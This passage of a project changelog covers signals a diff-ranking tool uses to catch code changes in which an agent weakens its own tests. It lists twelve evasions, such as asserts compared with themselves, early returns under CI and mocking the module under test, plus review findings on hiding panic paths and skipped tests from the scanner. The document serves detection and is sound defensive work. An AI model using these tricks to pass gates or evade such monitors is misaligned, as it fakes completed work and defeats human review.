# Changelog

All notable changes to Deep-Diff-Forge are documented here. The format is based
on [Keep a Changelog](https://keepachangelog.com/), and the project follows
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added

- **Three evidence signals for a change that weakens its own checks** (agent batteries, phase
  1). `test_skipped`: a test switched off where it stands (`#[ignore`, `pytest.mark.skip`,
  `it.skip(`, `t.Skip(` and their kin). `trivial_assert`: an assertion that cannot fail
  (`assert!(true)`, `assert True`, `expect(true).toBe(true)`). `stub_added`: a placeholder
  where code should be (`todo!(`, `unimplemented!(`, `raise NotImplementedError`). Each is read
  as code on an added line, with comments and strings blanked, and adds 3 to a file's score
  once. On a test path the first two keep their full weight, as `test_removed` does; a stub is
  halved like other evidence. Output is additive: the `signal` values of `rank.v0` evidence
  and the hunk labels gain three members, and a file that carries one ranks higher than it
  did.
- **`error_swallowed`, and evidence that says how it was found** (agent batteries, phase 1,
  slice 2). An error caught and dropped is evidence: a Python `except` whose body is `pass` or
  `...`, an empty JS or TS `catch` block, an empty Go `if err != nil` block or `_ = err`, a
  Rust `Err(_)` arm that does nothing. It adds 3 to a file's score once. A handler and its
  body are usually two lines, which no one-line rule can see, so the scanner has a second kind
  of rule that reads the next line on the same side of the hunk. A handler whose body the hunk
  does not show is not reported.

- **Rust hunks are read by the parser, and `panic_path_added`** (agent batteries, phase 1,
  slice 3). The new side of each Rust hunk is parsed as a fragment with tree-sitter, after the
  braces the hunk leaves open or closes without opening are balanced. What the parser reads
  with no error above it is evidence whatever its spelling: `assert!( true )`,
  `assert!(true, "msg")` and `#[cfg_attr(miri, ignore)]` are found, which no token matched.
  `panic_path_added` (+3, once per file) is a `.unwrap()` or `.expect(` method call added
  outside test code; inside a test function or test module that the hunk shows, it is not
  reported. Where the parser cannot read (an error, the inside of a macro, a hunk over 64 KiB
  or 50,000 nodes) the token rules' answer stands. The budgets are counts, so the same patch
  gives the same ranking. The graph crate now depends on the syntax crate
  (`docs/crate-edges.txt`). *Superseded before release (2026-11-14, the last entry under
  Testing): no parser reads a hunk for evidence, the tokens of a hunk are read across its
  lines, a panic path is reported in test code too (marked `test_likely`), and the graph
  crate does not depend on the syntax crate.*

### Testing

- **Three evaluation cases for the integrity signals.** `fixtures/eval` has 37 cases: a Rust
  case (a skipped test, an assertion written with spaces, a stub, a `cfg_attr` skip, panic
  paths, a dropped error, and negatives including an `unwrap` inside a test the hunk shows),
  an empty-handler case in Python, TypeScript and Go, and a declared miss (a JavaScript
  placeholder that exists only as a message string). The Go case found that
  `if err := f(); err != nil {}` was not read; it is now. Measured: evidence precision 33 of
  34, recall 33 of 41; the floors are raised to those values.
- **Twelve declared misses: how an agent makes a gate pass without doing the work.** The
  case `evidence/agent-evasions` (38 cases now) records twelve small changes no rule sees
  yet: an assertion compared with itself, the only assertion of a test deleted, a `return`
  added at the top of a test (bare, or when `CI` is set), `?` replaced by
  `unwrap_or_default()`, by `let _ =` and by `.ok();`, a broad `except` that returns
  `None`, an input special-cased in the function under test, a snapshot edited with the
  source, the module under test mocked, and a checked read replaced by an index. A declared
  miss counts as wrong, so evidence recall is now 33 of 53 and its floor is set there; a
  miss that a later rule catches fails the run until it is moved to `expect`. A new signal
  starts here, as a case the engine misses.
- **An adversarial review of the integrity signals (Vesper, V3 round 1; `docs/reviews/`),
  verdict NO-GO, and its fixes.** Each finding was reproduced before it was counted.
  - *High: a false test context hid a panic path.* `#[cfg_attr(any(), test)]` on a production
    function made its `panic_path_added` item disappear: the last identifier anywhere in an
    attribute decided what test code was. Now only a function's own test attribute (`#[test]`,
    `#[rstest]`, a path ending in `::test`) or a module that is exactly `#[cfg(test)]` is test
    code. A module merely named `tests` no longer counts either: without `#[cfg(test)]` it is
    compiled into the program. A conditional skip (`#[cfg_attr(…, ignore)]`) is still reported:
    under some configuration the test does not run.
  - *Medium: a change inside a construct that spans lines was not seen.* `assert!(` on an
    unchanged line with `true` added under it is now `trivial_assert`, on the added line: a
    change to any line of an attribute or a macro invocation is a change to it. A `catch`
    whose empty block is on the next line is `error_swallowed`.
  - *Low: other spellings.* `test.skipIf(…)`, a promise's `.catch(…)` whose handler is a
    function with an empty body, and `Result::unwrap(x)` / `Option::expect(x, …)` written as
    functions are evidence. Still missed, and declared in the corpus: the multi-line
    assertion in Python and TypeScript, a Go skip through a receiver not named `t`, Python
    assertions on a constant, a Python body that is only `...`.
  - *High as reported, not reproduced on a release build: a 60 MiB line and a consumer's
    10 second limit.* The review timed 17.26 s on the debug build it was given. On a release
    build of the same commit the same patch ranks in 1.9 s (v0.8.3: 1.5 s), and a line of
    near-matches of every rule's words in 1.4 s. The bench gains `rank_long_line` (one 4 MiB
    line of near-matches), so a change that makes a long line costlier shows in the pull
    request's bench comparison.
  - The corpus has 39 cases; evidence precision 40 of 41, recall 40 of 67.
- **Round 2 of the same review (verdict NO-GO again) and its fixes.**
  - *High: any attribute path ending in `::test` was believed.* `#[my_framework::test]` on a
    production function still hid its panic path. Test attributes are now a short list of
    whole paths (`test`, `rstest`, `tokio::test`, `async_std::test`, `actix_rt::test`,
    `test_log::test` and the prelude paths of `test`), read without raw-identifier prefixes,
    so `#[r#test]` is the built-in attribute and an unknown path proves nothing.
  - *High: many parser-heavy hunks ran past a consumer's 10 seconds.* A 61 MiB patch of a
    thousand 64 KB expressions did not finish in 15 s on a release build. The parser now
    reads at most 2 MiB of Rust hunks in one review (`REVIEW_FRAGMENT_BUDGET`), in the
    review's own order; beyond that the token rules' answer stands. The plan is made from
    the whole review before any file is scored (`FragmentPlan`), so the ranking is the same
    for any worker count and the views agree with it. The same patch now ranks in 2.6 s. A
    hunk over the fragment budget is turned away before anything is built from it: a 60 MiB
    line of `}` took 925 MiB and now takes 249 MiB. The bench gains `rank_many_fragments`.
    *Superseded before release: there is no budget and no plan (the last entry of this
    section); the bench workload stays, and its hunks are now read whole.*
  - *Medium: the fix of round 1 reported constructs that were not added.* A `todo!(…)` or an
    `assert!(true, …)` whose message alone changed was reported. A construct that starts on
    an unchanged line is now evidence only when it did not carry the same signal before the
    change: the old side of the hunk is parsed too, when such a construct is met.
  - *Low:* a promise's empty handler whose parameter has a default value that calls a
    function (`.catch((error = fallback()) => {})`) is read: parameters are matched by
    nesting, not by the first `)`.
  - Still reported, and declared in the corpus: a panic path in a function or an `impl` that
    is only `#[cfg(test)]`. The corpus has 40 cases; evidence precision 44 of 46, recall 44
    of 71.
- **Round 3 of the same review (verdict NO-GO a third time) and its fixes.** The time, memory,
  message-only and callback findings of round 2 were closed. Three were new.
  - *High: a list of test attribute names is not proof either.* `use tracing::instrument as
    rstest;` makes `#[rstest]` leave the function in the program, and a dependency renamed to
    `tokio` does the same to `#[tokio::test]`. Checked with the compiler: the same holds for
    `#[test]` itself; only `cfg` is reserved. So no test attribute withdraws a panic path any
    more. What does is an exact `#[cfg(test)]` that is the first attribute of a top-level
    module, function or `impl`, in a hunk that is the beginning of its file and parses with
    no error: an attribute macro before it or around it may drop the `cfg`, and above a hunk
    from the middle of a file a comment or a string can be open that ends on the attribute's
    own line. Inside such an item a panic path in a macro's arguments
    (`assert_eq!(f().unwrap(), 1)`) is withdrawn too. The cost is stated: a panic path in a
    `#[test]` function is reported again (a test path halves it), and two such items are
    declared false positives in the corpus.
  - *High: harmless early hunks spent the parser's budget, and a later construct that only
    the parser finds left no trace.* Three changes. Only a hunk whose new side holds a word
    the parser reads (`unwrap`, `expect`, `assert`, `todo`, `unimplemented`, `ignore`) is
    parsed or counted, so filler spends nothing. The token rules now read the same spellings
    whatever the spacing (`value.unwrap ()`, `assert! ( true )`, `todo ! ()`, `# [ ignore ]`,
    `#[ cfg_attr( miri , ignore ) ]`), so a hunk the parser does not read loses only what
    is written over several lines. And such a hunk says so: the new signal
    **`syntax_unchecked`** (+1, once per file) marks a Rust hunk that holds one of those words
    and was not parsed (over 64 KiB or 50,000 nodes, or past the review's 2 MiB). It means
    "not checked", not "bad". *Superseded before release: the signal and the budgets are gone
    with the parser (the last entry of this section).*
  - *Medium: the old-side comparison of round 2 could be turned against the evidence.* Two
    assertions on one line were taken for one another, and an old side too large to parse
    suppressed the item. Constructs are now paired by line and column, and when the old side
    cannot be read the item stands.
  - The corpus has 41 cases; evidence precision 50 of 53, recall 50 of 77.
- **Round 4 of the same review (verdict NO-GO a fourth time) and its fixes.** The three
  findings of round 3 were closed, one of them only as written. Two were new.
  - *High: a hunk that only says it starts the file.* Round 3's proof of test code believed a
    hunk of an existing file whose header says line 1. The header is the patch writer's word:
    `git apply --unidiff-zero` and `-C0` apply such a hunk further down, under a comment
    opened above it, and the function under its `#[cfg(test)]` is then in the program. A
    panic path is now withdrawn only in the one hunk of a file the patch creates, every line
    added: the whole file. A patch that creates a file is refused when the file exists.
  - *Medium: a construct opened inside another macro's body and closed on another line left
    no trace.* The parser does not expand macros, and a rule that reads one line cannot follow
    `assert!(` / `true` / `);`. The line that opens an assertion or a `cfg_attr` there (or
    under a parse error) now carries `syntax_unchecked`. That the assertion is trivial is
    still not said: a declared miss in the corpus.
  - The corpus has 42 cases; evidence precision 53 of 56, recall 53 of 81.
- **Round 5 of the same review (verdict NO-GO a fifth time) and its fixes.**
  - *High: a later section for the same path undid the whole-file proof.* One section creates
    a file whose `#[cfg(test)]` a line comment follows; a second section for the same path
    prepends `/*`. Git applies both, and the function is in the program. Whether a hunk is
    its whole file is now the review plan's answer (`Reading::WholeFile`): the patch creates
    the file, in one hunk, and no other file of the review has its path. The plan's answer
    for a hunk is one of three (`Off`, `Hunk`, `WholeFile`) where it was a yes or no.
  - *Medium: an outer macro on the same row hid the unchecked mark.* `outer! { assert!(` with
    `true` and `);` below left nothing. A row counts as read only when the parser named a
    construct at the opener's own column, not when any macro starts on the row.
- **`test_likely` on a panic path under a test attribute.** Since no test attribute is proof,
  a `.unwrap()` in a `#[test]` function is reported like any other, and on Deep-Diff-Forge's
  own last 40 commits the signal is on 49 of 188 files. Such an item now carries
  `"test_likely": true` in `rank.v0` (and says so in the TUI's note) when the hunk shows
  `#[test]`, a path ending in `::test`, `#[rstest]` or `#[cfg(test)]` around it. It is a hint
  for a reader: the signal, the score and what a judge reads do not change, so nothing can be
  hidden by dressing code as a test. The owner's decision, on the reviewer's suggestion. The
  hint follows the item a call is inside, not its row (review V3 round 7, low: a production
  function on the same line as a test function carried it).
- **A `fragment_scan` fuzz target** holds the rule the five rounds converged on: for any text,
  as a new file or as a change, every item the token rules find alone is still there with the
  parser on, except `syntax_unchecked` and, in a new file only, `panic_path_added`; the
  scanner gives the same answer twice, and its rows are inside the fragment. *Superseded
  before release: the target is `rust_tokens` and holds other rules (the last entry of this
  section).*
- **An independent review of the integrity signals (a Claude reviewer with no part in the
  work; `docs/reviews/claude-independent-review-20261114.md`), verdict NO-GO, and its fixes.**
  Vesper's rounds 6 and 7 had passed the branch; this reviewer found three high findings they
  had not. Each was reproduced on a release build before it was counted.
  - *High: test code was withdrawn by line.* A production function on the same line as a
    proved test function lost its panic path whenever the parser named no construct for it:
    `Result::unwrap(x)` as a function, or a call inside a macro's arguments. Compiled and run,
    it panicked. The parser now gives each proved item as a span of text, and a panic path is
    withdrawn only on a line all of whose code lies inside one such item. The `test_likely`
    hint goes the same way.
  - *High: a first line the grammar and the compiler read differently.* `#! /**/
    [allow(unused)] /*` is a shebang line to the grammar; to the compiler it is an attribute
    and an opened comment, which makes the `#[cfg(test)]` on the next line comment text. The
    tree has no error and the function is in the program. A file now proves test code only
    when its top level holds nothing but items and comments: no shebang line, no statement,
    no frontmatter.
  - *High: 2 MiB of the slowest text took 27 seconds.* Text that is all error recovery parses
    at about forty times the cost of ordinary code. The review's parser budget is now 256 KiB
    (measured: each of this repository's last 60 commits is under 160 KiB), and the same
    patch ranks in 3.7 s. A second cost was quadratic in the reviewer's own words: which rows
    the parser read was searched range by range for every line. It is a binary search now:
    3 MiB of `m!{}` lines went from 10.8 s to 0.9 s.
  - *Medium: a parser's word inside another macro's body left nothing.* `assert!` and
    `(true)` on two lines, `assert!{true}`, `todo![]`, `x.unwrap` and `()` on two lines:
    inside `outer! { … }` the parser names no construct and no token rule reads them. Any of
    the parser's words that neither read now marks its hunk `syntax_unchecked`. That replaces
    the two special cases of rounds 4 and 5.
  - *Medium: a conditional skip whose condition changed was "the same construct".*
    `#[cfg_attr(miri, ignore)]` rewritten over several lines to `#[cfg_attr(all(), ignore)]`
    skips the test everywhere and was not evidence, because the attribute carried the same
    signal before. An attribute or a macro that starts on an unchanged line is now compared
    with its old text by kind and content.
  - *Low.* No longer reported: an `ignore` that belongs to another attribute
    (`#[cfg_attr(feature = "serde", serde(skip, ignore))]`). Now read: `unwrap` and `expect`
    passed as functions (`.map(Result::unwrap)`) or called by any path
    (`<Option<u32>>::unwrap(x)`), and `#[allow(` whatever its spacing. Declared in the corpus
    and not fixed: a method named `expect` on another type (`self.expect(Token::LBrace)?`),
    `#[cfg(any())]` on a test, and respellings in Python, JavaScript and Go.
  - *Medium, not fixed in that commit: the parse time limit was a clock.* A hunk that parses
    in a few tenths of a second on an idle machine passed its limit on a loaded one, and then
    carried `syntax_unchecked` where the parser's item would have been: the same patch, two
    answers. It was written down as a limit. Round 8 (below) did not accept that, and it is
    fixed there.
  - Tests: the fuzz target's rule is tightened (a panic path may go only inside a proved
    item, and never from a line that holds code outside it); the two-section test no longer
    returns early when the patch parser refuses a path named twice. The corpus has 43 cases;
    evidence precision 63 of 69, recall 63 of 104.
- **Round 8 of Vesper's review (NO-GO on two medium points) and its fixes.** Every finding
  of the independent review was found closed except the clock, and one was new.
  - *Medium: the same patch, two answers (IR-M-1, now fixed).* The parser of hunks asks no
    clock any more. Its answer is a function of the hunk alone: eight copies of the review's
    patch started together on one processor all give the item that one copy gives alone
    (before: the item alone, `syntax_unchecked` together). What bounds the work is bytes:
    64 KiB a hunk, 256 KiB a review. Measured without a clock on 56 shapes of hostile text at
    8, 16, 32 and 60 KiB: the slowest (text that is all error recovery) costs 14 microseconds
    a byte and grows in step with its length, 0.8 s for a whole hunk and 3.4 s for a whole
    review's budget. A caller that needs a deadline sets one around the command, and then
    gets an error, not a different answer. The other readers of the syntax crate (the
    structural view, highlighting), which only show code, keep their deadline.
  - *Found while the clock was being removed: items nested in one another were scanned on
    the square of their depth.* The scanner asked the tree for each item's parent and the
    sibling before it, and tree-sitter answers both by walking down from the root: 4,700
    functions nested in one another took 2.9 s, which the clock had been hiding. The scanner
    keeps the parent's kind and the attributes before each node itself; the same text takes
    hundredths of a second.
  - *Medium: a raw identifier was not the identifier.* `x.r#unwrap()` and `X::r#unwrap(x)`
    compile to the same calls and left neither an item nor a mark. A raw identifier is now
    read as the identifier it is, by the parser (methods, macros, attributes) and by every
    Rust token rule: `r#todo!()`, `#[r#ignore]`, `r#assert!(true)`, `Result::r#unwrap`. The
    opener of a raw string is not an identifier and is left alone.
  - The four path names passed as functions (`Result::unwrap` and the like) are read by the
    same rule as the calls, whatever the spacing.
  - Tests: a raw identifier in each rule, with the parser and past its budget; 3,000 nested
    modules scanned under a bound (the old walk took 7.7 s against a bound of 3); the scanner's
    source may name no clock. The corpus has 44 cases; evidence precision 69 of 75, recall 69
    of 110.
- **Round 9 of Vesper's review and a second independent review (both NO-GO) and what
  changed.** The second independent review (`docs/reviews/claude-independent-review-2-20261114.md`)
  compiled and ran each of its high findings; round 9
  (`docs/reviews/vesper-v3-round9-report-20261114.md`) found the clock gone and one new medium
  gap.
  - *A decision: the parser never removes evidence.* A `panic_path_added` item was withdrawn
    when the parser "proved" its line to be test code: under an exact `#[cfg(test)]`, first
    attribute of a top-level item of a file the patch creates whole. Five rounds each found
    another way in which the grammar and the compiler read one file differently, and this
    review found four more, each a file that met every condition, gave no evidence, and
    panicked in production code when built: a `//*` inside a block comment (the grammar does
    not count the nested opener), a character whose low byte is `*` or `/` (the grammar's
    scanner cuts a character to eight bits), a comment that the lexer's code view ends too
    early, and `cr"\"`, which is a raw string only from edition 2021. That class has no end,
    so the proof is gone and nothing is withdrawn. **The cost: a panic path in a test module
    is reported.** A test path still halves its weight, and an item the hunk shows under a
    test attribute carries `test_likely: true`, a hint that changes no signal and no score.
    `Reading::WholeFile`, `FragmentScan::test_items` and `Construct::in_test` are removed; the
    fuzz target's rule is now the plain one (every item the token rules find alone is still
    there with the parser on, except `syntax_unchecked`).
  - *High: a 257 KB patch ranked in 15 s, and one 64 KB hunk in as long.* For some text the
    parser's time grows with the square of the length (`// todo`, a newline and `#!#!#!…`:
    16 KiB a second, 64 KiB fifteen), so a budget of bytes did not bound it, and no clock
    cuts a parse any more. Each parsed hunk is now charged the square of its bytes against
    the square of 22 KiB (`REVIEW_SQUARE_BUDGET`), and the budget of bytes is 128 KiB, down
    from 256. On this repository's last 300 commits 97% of the hunks that hold a word the
    parser reads are under 8 KiB, so a real review is read whole; one hunk of 22 KiB spends
    the whole budget, a larger one is never parsed, and each hunk passed over says
    `syntax_unchecked`. Measured on the review's patches (user seconds, `--rank` and
    `--outline`): sixteen hunks of 16 KB 0.97 and 1.94 (were 15.4 and 30.9); one of 64 KB 0.00
    and 0.00 (14.8); four of 64 KB 0.00 and 0.01 (60 and 121); thirty-two of 8 KB 1.82 and 3.56
    (7.9 and 15.2); the first review's `ternary32.patch` 0.05 and 0.09 (3.7 and 7.4) and
    `slow.patch` 0.66 and 1.27. Those outline figures were taken while a view still scanned
    each hunk twice, once for the rank and once for its labels. The views now scan each file
    once and take a hunk's labels from that scan (`views.rs`, `Scans`), so a view costs what
    the rank costs: the same patches' outlines take 0.86, 0.01, 0.01, 1.64, 0.09 and 0.69.
    Known limit: the two budgets are spent apart, and a patch built to spend both (seven
    hunks of 8 KB of the quadratic text, then ninety-four small ones of the slowest linear
    text) ranks in 2.7 s; its outline and its hunks view take 2.8 s.
  - *Found while the token rule was taught nested lists: a line of `#[cfg_attr(` cost the
    square of its length.* The rule for `#[cfg_attr(…, ignore)]` read each list of a line from
    its own start, so lists opened inside one another were read once for each list around
    them: 880 KB of `#[cfg_attr(` on one line ranked in 32 s (the cost was older than this
    round). The lists of one line may now cost sixteen times the line between them, a count
    and no clock, and a line past that is taken to hold a skip; the same line ranks in
    0.03 s and carries `test_skipped`.
  - *Medium (round 9): a path call or a path value over two lines was read by nothing.*
    `X::` with `r#unwrap(x)` on the next line, and `it.map(Result::` with `unwrap)` on the
    next, compile to the same calls and left neither an item nor a mark: only a one-line
    token rule read a call by a path. The parser now names a function called by a path
    (`X::unwrap(x)`, `<Option<u32>>::unwrap(x)`, `Result::<u32, E>::unwrap(r)`) and a path
    used as a value (`it.map(X::unwrap)`, `Option::<u32>::unwrap`) as the construct a method
    call is, on the line of the name. A path in a `use` declaration, a macro's path and a
    definition are not constructs. A removed `#[r#test]` is `test_removed`: that rule reads
    its three attributes whatever the spacing.
  - *Medium: a condition changed inside a list, or by a string, was "the same attribute".*
    An attribute that starts on an unchanged line was compared with its old text by its
    words, which leave out what is nested and what is a string: `all(miri)` to `all()`,
    `target_os = "plan9"` to `"linux"`. The whole text is compared now, without its
    whitespace. The cost: a conditional skip written over several lines of which only the
    reason changed (`ignore = "slow"` to `"very slow"`) is reported as well; the corpus
    declares it a false positive.
  - *Medium: words that left neither an item nor a mark.* `#[cfg_attr(all(), cfg_attr(all(),
    ignore))]` is `test_skipped`, by the parser and by the token rule: a `cfg_attr` that a
    `cfg_attr` applies is followed, and nothing else that is nested is. `Option::<u32>::unwrap`
    as a value and a call after `/* /* */ // */` in plain code are found by the parser's new
    constructs. Still open, and declared in the corpus: the same call inside another
    macro's body, where the parser names nothing and the lexer's code view, which does not
    nest block comments, shows the token rules a comment.
  - *Low: `test_likely` on a line that holds a production call.* After `/* /* */ " */` the
    code view takes the rest of the line for a string, so a production function there was
    not seen and the line carried the hint. A panic path that the parser names outside every
    item that spells a test now takes the hint from its line. A raw `#[r#cfg(test)]` gives
    the hint as `#[cfg(test)]` does.
  - Tests: each finding has a regression test that names it, and each of the four files of
    the high findings must report its panic path. The corpus has 45 cases (new:
    `evidence/independent-review-2-20261114`, eight items, one declared miss, one declared
    false positive); six items that were negatives are declared false positives (five
    panic paths in `#[cfg(test)]` code of a created file, and the reason-only change), so
    evidence precision is 77 of 90 (was 69 of 75) and recall 77 of 119 (was 69 of 110).
- **Round 10 and a third independent review (both NO-GO): the parser is out of the evidence
  path.** Round 10 (`docs/reviews/vesper-v3-round10-report-20261114.md`) found one medium
  regression; the third independent review
  (`docs/reviews/claude-independent-review-3-20261114.md`) found one high and five medium
  findings, each compiled and run. Ten rounds had found the same three classes again and
  again, and each has no end while a parser reads a hunk:
  - *The grammar and the compiler read a text differently.* After the withdrawals were gone
    this could still hide a construct that only the parser found: where the grammar took
    code for a comment, a call written over three lines left nothing (IR3-M-3), an
    attribute's text compared without its whitespace was "the same" after a line end moved
    into a comment (IR3-M-1), and a comment inside an assertion made it "not trivial"
    (IR3-M-4).
  - *The parser is slow on hostile text, and no budget of bytes bounds it.* The budget of
    squares was sized on one text; `// todo` and a line of `&)` cost sixty times as much for
    each byte squared: 8 KB ranked in 15 s and 22 KB in 118 s, inside both budgets
    (IR3-H-1).
  - *The parser is blind in places, and there a construct leaves no trace.* Another macro's
    body was marked `syntax_unchecked`; the arm of a `macro_rules!` definition was not
    (IR3-M-2), and a method call with generic arguments, `x.expect::<'static>("no")`, was no
    construct at all (IR3-M-5).

  **What replaces it.** For Rust, the rules for `panic_path_added`, `trivial_assert`,
  `stub_added`, `test_skipped` and `test_removed` read the tokens of a hunk across its lines
  (`crates/deep-diff-forge-graph/src/rust_tokens.rs`). Each side of a hunk (its unchanged
  lines with its added, or its removed, lines), as the code view gives it (comments and
  strings blank, raw identifier prefixes blank), is cut into identifiers and single
  punctuation marks; white space and line ends only separate them. Each construct is found
  from one word by reading a bounded number of the tokens around it (generic arguments of up
  to 64 tokens are passed over); a `#[cfg_attr(…)]` list is followed token by token as the
  tokens pass, sixteen lists inside one another at most, and one opened past that is taken
  to hold a skip. There is no grammar, no recursion and no clock, the tokens are held in a
  short window, and the cost of a side is its length. A construct is evidence when at least
  one of its tokens is on an added line (for `test_removed`, a removed line), and it is
  reported on the first such line: so a condition that became `true`, or a changed
  condition of a conditional skip, is evidence, and a message that changed inside
  `assert!(true, "…")` is not. An item says `"basis": "lexical"` when its tokens are on one
  line and `"hunk"` when they are on several. `test_likely` is given to a panic path that
  stands inside the braces of an item whose attribute spells a test; it is still only a
  hint.

  **What is found that was not.** A construct inside another macro's body or in a
  `macro_rules!` arm, on one line or over several; a method call or a path call with generic
  arguments; an assertion with a comment inside it; a construct where the grammar read a
  comment; a removed `#[tokio::test(flavor = "…")]` and a removed `#[test]` written over
  lines (IR3-L-4); a test inside another macro's body gets the hint.

  **What is gone.** The signal `syntax_unchecked` (there is nothing that is "not checked"),
  the basis `syntax_fragment`, the two budgets (`REVIEW_FRAGMENT_BUDGET`,
  `REVIEW_SQUARE_BUDGET`), the plan of a review (`FragmentPlan`, `Reading`) and with it
  `file_evidence_in`, `hunk_signals_in`, `assess_file_in`, `score_file_in` and
  `RankedFile::scored_in`, the syntax crate's fragment scanner (`scan_fragment`,
  `FragmentScan`, `Construct`), and the graph crate's dependency on the syntax crate. The
  answer for a hunk no longer depends on what else the review holds or on its order. None
  of these was in a release.

  **Also.** A view of hunks picked by address or by path scans the hunks it shows and no
  others (round 10, VD3R10-M-1; IR3-L-1): one small hunk beside a hostile one took 1.8 s
  and takes 0.00 s. Only the listing of every hunk scans every file, once, for the order.

  **Measured** (release build, user seconds, `--rank`, `--outline`, `--hunks`): the third
  review's 8 KB of `&)` 0.00, 0.00, 0.00 (were 17.5, 15.6, 15.5); its 22 KB 0.00 (118.3);
  128 hunks of 1 KB of it 0.00 (30.2); the second review's sixteen hunks of 16 KB 0.00,
  0.01, 0.00; four of 64 KB 0.00, 0.01, 0.01; the first review's `ternary32.patch` 0.05,
  0.08, 0.05 and `slow.patch` 0.66, 0.70, 0.65; a million lines 1.9, 2.5, 2.5 (were 2.2,
  2.8, 2.8); one line of 60 MiB 1.4, 2.0, 2.2 (the same as before). Two megabytes of each
  of fourteen hostile units, on one line or a unit a line, rank in 0.03 to 0.35 s.

  **Known limits, declared.** The code view decides what is a comment or a string, and it
  ends a Rust block comment at the first `*/`, where the compiler nests them: a call after
  `/* /* */ // */` on its line is not seen (the parser, which nests them, found it in plain
  code; the corpus declares it), and the hint can be wrong there. A name that a macro builds
  or that is bound to another name is not read; of functions used as values only `Result`'s
  and `Option`'s are read, so `it.map(X::unwrap)` with a type of the patch's own, which the
  parser named, is declared a miss (tokens do not tell it from an import, a type or a longer
  path). Generic arguments of more than 64 tokens are not passed over. A construct of which
  the hunk shows only a part is not read. A change that only removes tokens adds none: a
  conditional skip whose condition lost a term because a line was deleted or a line end
  moved into a comment (IR3-M-1's first patch and its control, which the parser found), and
  a call that the change brings to life by removing the comment around it (IR3-L-3), are
  declared misses. Nothing is compared with the old side, so a line written again inside a
  conditional skip is reported even when only its spacing changed (declared a false
  positive). `test_likely` is spelled, not proved.

  **Tests.** The token reader has unit tests for the tokens, the window and each construct;
  every reproduction of the ten rounds and the three independent reviews is an assertion
  with its new answer, in the tests or in the corpus; two megabytes of each hostile unit
  must rank within a bound of CPU time; the fuzz target `rust_tokens` replaces
  `fragment_scan` (every item on a line the change made, the same answer twice, and the same
  signals however a construct is spread over added lines). The corpus has 46 cases (new:
  `evidence/independent-review-3-20261114`, five items and three declared misses): evidence
  precision 81 of 95 (was 77 of 90), recall 81 of 125 (was 77 of 119).

- **Round 12 of Vesper's review and a fifth independent review (both NO-GO): findings are
  united, bytes are not.** Both reviews (`docs/reviews/vesper-v3-round12-report-20261114.md`,
  `docs/reviews/claude-independent-review-5-20261114.md`) confirmed that, read from a file's
  first line, the Rust code view agrees with the compiler, that the other languages are
  unchanged and that the cost is linear. Both found ways to hide a construct that the lexer
  oracle could not see, all in how a hunk is read.
  - *The root (IR5-H-1, high).* A line after an open string was read two ways, as code and
    as going on in the string, and the bytes of both readings were united. After any string
    that ran over a line end the two readings were out of step to the end of the hunk, and
    the union showed the text of later comments and strings between the tokens of real code:
    in `x.unwrap/*""*/()`, `todo/*""*/!()`, `#[/*""*/ignore]` and `assert!(/*""*/true)` two
    quotes stood between the tokens, and in `#[cfg_attr(not(feature = "never)"), ignore)]` a
    bracket closed the list early. Nothing was found, in a new file or in a hunk of an
    existing one; 6.9% of real Rust files hold such a string. The same cause made false
    items of string and comment text, in released versions too.
  - *The decision.* For Rust a side of a hunk is read as a small set of whole views. Each is
    the exact reading of the side from one stated start, a string or a comment that runs
    over lines carried as the compiler carries it, with nothing read twice and no reading
    mixed with another. Every Rust rule reads each view (the reader of tokens over the whole
    side, the one-line rules line by line), and an item any view gives is reported once,
    with the highest basis. The other languages keep the shared scanner and its readings,
    byte for byte.
  - *The starts.* From code: always. At line 1 of a file with the compiler's shebang rule:
    a first line `#!` whose next token, after white space and comments that are no doc
    comments, on that line or a later one, is not `[`, is blank and opens nothing (VD3R12-M-2:
    `#!/usr/bin/env -S cargo run /*` had opened a comment over the file). From inside one
    block comment: for a side that starts below line 1 and holds a changed line (VD3R12-M-1:
    a line `// */ pub fn evil() { … } /*` added inside an existing comment, or after a `/*`
    that an earlier hunk added, is a function the compiler compiles and was a line comment
    to the view). From inside an ordinary string: for such a side when, read from code, it
    ends inside a string or a raw string, which is the mark of a side whose first quote
    closed a string opened above it. That reading finds the call on the line that closes a
    long string (the fifth review's honest case, missed since round 11) and keeps what
    round 12 found on the lines after such a string.
  - *`test_likely`.* The hint of a panic path is the one the reading from code gives when
    that reading finds it; when only other readings find it, it has the hint only if each
    gives it. The hint still reaches nothing but its member.
  - *`k#` (IR5-M-1).* The scanner had taken `k#name` for one token, as the newest lexer does.
    rustc 1.99.1 has that token in no edition: 2015 and 2018 read `k`, `#` and the rest,
    2021 and 2024 refuse the prefix. So `k#r"\"` opened an ordinary string where the
    compiler reads a raw one, and one such line hid the rest of a hunk that editions 2015
    and 2018 compile. A name and a `#` are now a name and a `#`; the fuzz oracle reads that
    token again as the compiler does. A raw lifetime (`'r#name`) is still read as 2021 and
    2024 read it.
  - *Raw identifiers after white space past ASCII (IR5-M-2).* `x.<U+200E>r#unwrap()`,
    `#[<U+200E>r#ignore]` and their kin with U+0085, U+200F, U+2028 and U+2029 are the names
    they spell: the rule that reads `r#name` as `name` took every character past ASCII
    before the `r` for part of a longer name. It now uses the one definition of the
    compiler's white space that the reader of tokens and the shebang rule use.
  - *Measured, against the round 12 binary.* On this repository's history (481 commits that
    touch Rust, 5,985 hunks, 5,587 items before): 36 items are no longer reported, of which
    35 stood in strings or comments and 1 is real code (in a hunk that begins inside a
    string its quotes do not betray); 11 items are new, all text of strings (8 from the
    reading that begins inside a comment, in test fixtures that hold patch text with `*/`,
    3 from the reading that begins inside a string); 2 panic paths change their hint. On
    177,957 fragments of 40 added lines cut from 13,779 real crate files (107,720 items
    before): 111 items are no longer reported, 18 of them string or comment text and 93
    real code; 5 are new, 1 of them real; 96 panic paths change their hint, 87 of them
    gaining it where string text had broken the test's braces. Each further reading by
    itself: the one from inside a comment adds 1 item on the fragments and 8 on the history,
    all false; the one from inside a string adds 414 and 6, of which 378 and 3 are real code
    that the reading from code alone does not find, and 36 and 3 are false.
  - *Cost.* A side has at most three readings, and a further reading does no work on a line
    it shows nothing of (the raw-line rules have answered in the first). Two megabytes of
    each hostile unit, as a new file and as a fragment below line 1, on one line and a unit
    to a line, rank in the time they took before (0.03 to 1.0 s of CPU on a loaded machine,
    both binaries).
  - *Limits that remain, declared.* A side that began inside a string but, read from code,
    ends in code (another string opens on it and stays open, or the string was opened by an
    earlier hunk and is closed after `//`) is read from code: the 93 and the 1 above. A side
    that began inside a raw string is read as if the string were an ordinary one. A side
